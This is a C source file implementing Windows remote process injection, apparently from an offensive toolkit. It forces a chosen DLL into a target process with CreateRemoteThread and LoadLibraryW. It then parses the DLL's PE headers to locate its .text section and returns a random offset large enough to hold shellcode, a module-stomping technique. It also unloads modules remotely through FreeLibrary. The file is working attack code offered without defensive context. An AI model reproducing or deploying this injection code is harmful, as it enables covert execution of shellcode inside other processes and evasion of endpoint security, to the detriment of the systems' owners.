#include "commun.h"

DWORD prevOffset = 0;

#define MIN_GAP 20000  // minimum gap between two random offsets

DWORD get_random_offset(DWORD maxOffset) {

	DWORD newOffset = rand() % maxOffset;

	while ((newOffset > prevOffset ? newOffset - prevOffset : prevOffset - newOffset) < MIN_GAP) {
		newOffset = rand() % maxOffset;
	}

	prevOffset = newOffset;
	return newOffset;
}



// Check if a module is loaded in a process's address space
BOOL IsModuleLoaded(HANDLE hProcess, wchar_t* wInjectedLoadedModule) {
	HMODULE hMods[1024];
	DWORD cbNeeded;
	unsigned int i;
	wchar_t szModName[MAX_PATH];

	if (EnumProcessModules(hProcess, hMods, sizeof(hMods), &cbNeeded)) {
		for (i = 0; i < (cbNeeded / sizeof(HMODULE)); i++) {
			if (GetModuleBaseNameW(hProcess, hMods[i], szModName, sizeof(szModName) / sizeof(TCHAR))) {
				if (wcscmp(szModName, wInjectedLoadedModule) == 0) {
					return TRUE;
				}
			}
		}
	}

	return FALSE;
}



// Get a module handle from the process
HMODULE GetRemoteModuleHandle(HANDLE hProcess, wchar_t* wInjectedLoadedModule) {
	HMODULE hMods[1024];
	DWORD cbNeeded;
	unsigned int i;
	wchar_t szModName[MAX_PATH];

	if (EnumProcessModules(hProcess, hMods, sizeof(hMods), &cbNeeded)) {
		for (i = 0; i < (cbNeeded / sizeof(HMODULE)); i++) {
			if (GetModuleBaseNameW(hProcess, hMods[i], szModName, sizeof(szModName) / sizeof(TCHAR))) {
				if (wcscmp(szModName, wInjectedLoadedModule) == 0) {
					return hMods[i];
				}
			}
		}
	}

	return NULL;
}


LPVOID GetRXhole(HANDLE hProcess, wchar_t* wInjectedLoadedModuleName, size_t shellcodeLen) {
    
	if (!IsModuleLoaded(hProcess, wInjectedLoadedModuleName)) {
		LPVOID RXspot = NULL;

		SIZE_T mdlSize = (wcslen(wInjectedLoadedModuleName) + 1) * sizeof(wchar_t);

		PTHREAD_START_ROUTINE pLoadLibrary = NULL;
		pLoadLibrary = (PTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandleA("Kernel32.dll"), "LoadLibraryW");
		if (!pLoadLibrary) {
			printf("Failed to get LoadLibrary Address (%u)\n", GetLastError());
			return NULL;
		}

		PVOID mdlStrAlloc = VirtualAllocEx(hProcess, NULL, 0x1000, MEM_COMMIT, PAGE_READWRITE);
		if (!mdlStrAlloc) {
			printf("Failed to Allocate mem in the remote process (%u)\n", GetLastError());
			return NULL;
		}

		printf("[+] mdlStrAlloc : %p\n", mdlStrAlloc);

		BOOL writeStatus = WriteProcessMemory(hProcess, mdlStrAlloc, (LPVOID)wInjectedLoadedModuleName, mdlSize, NULL);
		if (!writeStatus) {
			printf("Failed to Write to the allocated mem (%u)\n", GetLastError());
			return NULL;
		}

		HANDLE hthread = CreateRemoteThread(hProcess, NULL, 0, pLoadLibrary, mdlStrAlloc, 0, NULL);
		if (!hthread) {
			printf("Failed to create remote thread (%u)\n", GetLastError());
			return NULL;
		}

		// Wait for the remote thread to finish
		WaitForSingleObject(hthread, INFINITE);


		// Check the thread exit code
		DWORD exitCode;
		if (!GetExitCodeThread(hthread, &exitCode)) {
			printf("Failed to get exit code (%u)\n", GetLastError());
			CloseHandle(hthread);
			return FALSE;
		}

		CloseHandle(hthread);

		PVOID mdlBaseAddr = LoadLibrary(wInjectedLoadedModuleName);
		if (!mdlBaseAddr) {
			printf("[!] Failed to resolve the remote module addr\n");
			return NULL;
		}
		IMAGE_DOS_HEADER* DOS_HEADER = (IMAGE_DOS_HEADER*)mdlBaseAddr;
		IMAGE_NT_HEADERS* NT_HEADER = (IMAGE_NT_HEADERS*)((DWORD64)mdlBaseAddr + DOS_HEADER->e_lfanew);
		IMAGE_SECTION_HEADER* SECTION_HEADER = IMAGE_FIRST_SECTION(NT_HEADER);

		LPVOID txtSectionBase = (LPVOID)((DWORD64)mdlBaseAddr + (DWORD64)SECTION_HEADER->PointerToRawData);
		DWORD txtSectionSize = SECTION_HEADER->SizeOfRawData;


		if (txtSectionSize < shellcodeLen) {
			printf("[-] Choose Another Module with a large \".text\" section\n");
			return NULL;
		}

		// Initialize random seed
		srand((unsigned)time(NULL));

		DWORD randomOffset = get_random_offset(txtSectionSize - shellcodeLen);
		printf("[+] randomOffset %d\n", randomOffset);

		RXspot = (LPVOID)((DWORD64)txtSectionBase + randomOffset);

		return RXspot;
	}
	else {
		printf("[!] %ws is already loaded in the target process\n", wInjectedLoadedModuleName);
		return NULL;
	}

}


// Unload a module from a process
BOOL UnloadModule(HANDLE hProcess, wchar_t* wInjectedLoadedModule) {

	HMODULE hMod = GetRemoteModuleHandle(hProcess, wInjectedLoadedModule);

	if (hMod == NULL) {
		printf("Module not found.\n");
		return FALSE;
	}

	// Get address of FreeLibrary in kernel32.dll
	LPVOID FreeLibraryAddr = (LPVOID)GetProcAddress(GetModuleHandleA("kernel32.dll"), "FreeLibrary");

	if (FreeLibraryAddr == NULL) {
		printf("Failed to get address of FreeLibrary (%u)\n", GetLastError());
		return FALSE;
	}

	// Call FreeLibrary in the context of the remote process
	HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)FreeLibraryAddr, hMod, 0, NULL);

	if (hThread == NULL) {
		printf("Failed to create remote thread (%u)\n", GetLastError());
		return FALSE;
	}

	// Wait for the remote thread to finish
	WaitForSingleObject(hThread, INFINITE);

	// Check the thread exit code
	DWORD exitCode;
	if (!GetExitCodeThread(hThread, &exitCode)) {
		printf("Failed to get exit code (%u)\n", GetLastError());
		CloseHandle(hThread);
		return FALSE;
	}

	CloseHandle(hThread);

	if (!IsModuleLoaded(hProcess, wInjectedLoadedModule)) {
		return TRUE;
	}
	
	return FALSE;
}